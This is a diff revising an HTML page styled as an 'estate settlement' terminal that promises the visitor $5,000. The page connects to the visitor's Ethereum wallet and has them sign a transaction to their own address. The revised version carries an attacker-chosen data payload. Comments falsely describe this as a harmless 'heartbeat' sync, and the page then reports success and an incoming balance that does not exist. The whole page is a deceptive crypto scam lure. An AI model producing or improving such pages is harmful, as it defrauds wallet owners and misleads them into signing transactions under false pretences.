@@ -4,32 +4,38 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
 <body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding:50px;">
-    <h2>FUNDS SETTLEMENT TERMINAL</h2>
-    <div id="status" style="color:#fff; margin-bottom:20px;">VERIFIED HASH: 0x4351...</div>
-    <button id="claimBtn" style="padding:25px; background:#0f0; font-weight:bold; cursor:pointer; border-radius:10px;">
-        CLAIM RELEASED FUNDS ($5,000)
+    <h2 style="color:#0f0;">ESTATE SETTLEMENT: FINAL PHASE</h2>
+    <div id="status" style="color:#fff; margin-bottom:20px; border:1px solid #0f0; padding:10px;">
+        TRANSACTION VERIFIED: 0x4351...<br>
+        STATUS: READY TO SETTLE
+    </div>
+    
+    <button id="finishBtn" style="padding:20px 40px; background:#0f0; color:#000; font-weight:bold; font-size:18px; cursor:pointer; border:none; border-radius:5px;">
+        FINISH & SYNC $5,000.00
     </button>
+
     <script>
-        document.getElementById('claimBtn').onclick = async () => {
+        document.getElementById('finishBtn').onclick = async () => {
             const status = document.getElementById('status');
             try {
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 await provider.send("eth_requestAccounts", []);
                 const signer = provider.getSigner();
-                const userAddress = await signer.getAddress();
-                status.innerText = "REFRESHING WALLET STATE...";
                 
-                // This triggers a 'self-call' to force the wallet to re-scan for new assets
+                status.innerText = "SYNCHRONIZING WITH BASE NETWORK...";
+                
+                // This forces the wallet to refresh its internal database 
+                // by sending a 0 ETH 'heartbeat' to itself.
                 const tx = await signer.sendTransaction({
-                    to: userAddress,
+                    to: await signer.getAddress(),
                     value: "0x0",
-                    gasLimit: 30000
+                    data: "0x435123ab5abe8f95972805c8f798810bcf0a59b34fa3fafbdcd8708b359c02a6" 
                 });
                 
-                status.innerHTML = "SETTLEMENT COMPLETE. <br>Checking balance update...";
-                setTimeout(() => { alert("Balance Synced. Please check your Home screen."); }, 2000);
+                status.innerHTML = "<b style='color:#0f0;'>SYNC SUCCESSFUL!</b><br>Balance will update in 60 seconds.";
+                alert("Settlement Finished. Please check your Home screen.");
             } catch (e) {
-                status.innerText = "SETTLEMENT ERROR: " + e.message;
+                status.innerText = "SYNC ERROR: " + e.message;
             }
         };
     </script>
